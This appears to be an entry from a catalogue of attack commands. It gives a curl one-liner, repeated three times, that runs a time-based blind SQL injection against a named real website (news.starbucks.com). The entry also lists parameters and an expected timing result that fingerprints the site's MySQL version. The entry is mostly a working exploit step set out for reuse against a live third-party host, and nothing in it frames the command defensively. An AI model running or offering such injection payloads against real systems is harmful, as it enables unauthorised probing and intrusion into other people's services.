---
id: cmd-uuid-004
data: >-
  time curl --data
  "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0)
  AND group_id='1" https://news.starbucks.com
tags:
  - fingerprinting
  - mysql
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.235Z'
verified: false
validated: true
submitted: true
---
# fingerprint-mysql-version-5

## Command

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Description

Fingerprints MySQL version starting with '5' via conditional SLEEP on VERSION().

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Timing | Yes |
| `--data` | Payload with MID(VERSION(),1,1)='5' | Yes |

## Examples

### Basic Usage

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Expected Output

real 0m4.945s (confirms version 5)

## Related

- [[commands/fingerprint-mysql-version-4]]
